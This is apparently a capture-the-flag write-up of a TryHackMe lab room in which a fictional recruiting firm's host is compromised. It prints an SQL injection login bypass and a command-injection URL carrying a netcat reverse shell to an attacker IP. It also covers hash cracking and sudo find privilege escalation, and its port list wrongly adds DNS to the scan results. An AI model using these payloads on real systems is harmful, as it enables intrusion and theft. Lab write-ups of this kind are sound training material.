---
title: "Tryhackme: Operation promotion Writeup"
description: "One engagement stands between you and your next title."
date: 2026-06-06
image:
  path: /assets/op.png
  alt: "Operation promotion"
author: vu1n
layout: post
categories: [Tryhackme]
tags: [Tryhackme, IDOR, OS command injection]
---

Operation promotion is a easy difficulty room. You are up for promotion at Hadron Security. Your senior lead, Mara, has handed you a solo engagement against RecruitCorp, a small recruiting firm with a public-facing portal. 
Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

## 1. Initial Enumeration

### Nmap Scan

Starting with a default script and version scanning to identify open services and ports:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 16:16 +0530
Nmap scan report for 10.48.143.237
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:23:80:d3:f9:83:ab:95:d8:c8:06:cc:43:00:39:19 (ECDSA)
|_  256 87:0f:0e:a0:da:80:28:18:b9:b4:e5:4d:9c:79:36:cb (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitCorp - Careers Portal
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-06T10:48:01
|_  start_date: N/A
|_nbstat: NetBIOS name: RECRUITCORP, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.71 seconds
```

So there are five open ports with /admin panel on port 80.
1. ssh **(22)**
2. http **(80)**
3. dns **(53)**
4. Netbios **(139)**
5. Netbios **(445)**

Also provided with the recruitcorp.thm hostname in the room, so we add it to our hosts file:
```
sudo sh -c 'echo "10.48.143.237  recruitcorp.thm" >> /etc/hosts'
```

Visiting http://recruitcorp.thm/admin, there is not much in source; we see login panel. Here authentication bypass via SQLi is working with the payload and it'll give us the dashboard.
```
admin@recruitcorp.thm' OR '1'='1
```
![Bypass](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/bypass.png)

## 2. Exploitation

### IDOR and command injection exploitation.

![Seven](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/seven.png)

If we lookup the ID 7 then we get on endpoint **/admin/sysmaint-checks/ping.php?host=**

Here the endpoint is vulnerable to OS command injection vulnerability

![OS command injection](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/osinj.png)

Go to https://www.revshells.com/ and choose **nc mkfifo** reverse shell with URL encoding. Now start listener with netcat on attackers machine replace id command with our shell and press enter, you'll get www-data
webserver shell.

```
http://recruitcorp.thm/admin/sysmaint-checks/ping.php?host=www.google.com;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%20192.168.136.153%204444%20%3E%2Ftmp%2Ff
```
![Netcat shell](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/ncshell.png)

After gaining the shell you can run **python3 -c 'import pty;pty.spawn("/bin/bash")'** for stable bash shell. Here there is one hash in the file **/var/www/html/config/db.conf**. If you crack that hash with john then
you'll get the password **spring----**. Use it to ssh into jford user and here you'll get the user.txt

![user](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/user.png)

For the privilege escalation we need to check which command we can run as root and doesn't need password. so type **sudo -l**

```
jford@recruitcorp:~$ sudo -l
sudo -l
Matching Defaults entries for jford on recruitcorp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```
And here we can see that we can run find command as root, so jump to https://gtfobins.org/ and search find binary. Here you'll be able to see that we can use below command to see the content of the root.txt.

```
sudo find /root/flag.txt -exec cat {} \;
```
![flag](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/flag.png)
